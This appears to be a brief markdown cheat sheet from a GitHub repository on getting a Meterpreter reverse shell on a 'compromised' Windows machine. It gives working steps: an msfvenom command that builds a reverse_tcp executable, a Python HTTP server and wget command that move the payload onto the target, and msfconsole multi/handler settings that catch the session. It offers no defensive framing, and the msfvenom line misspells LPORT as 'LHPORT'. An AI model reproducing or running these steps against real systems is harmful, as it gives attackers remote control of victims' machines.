# Meterpreter shell

Lets first create our payload using the msfvenom and then send it on the compromised machine and then run it..

    msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o revshell.exe LHOST=<> LHPORT=<>

Now lets transfer this file on the compromised machine using http python server deploy it on the machine using 

    python -m http.server <port>

Downlaod the file on the compromised machine using the command 

    wget http://<ip>:<port>/revshell.exe


![image](https://github.com/Theincognitomode/What-the-shell/assets/73027020/12923781-5b0c-4c55-b295-577409c73722)

Now run the msfconsole 


- Select the module multi/handler
- set the LHOST and LPORT
- set the payload

Now type `run`

![image](https://github.com/Theincognitomode/What-the-shell/assets/73027020/3f6bf96c-2bbf-41c7-903f-1273a013da48)

Now just double click on the payload that you sent and you will get the meterpreter session..







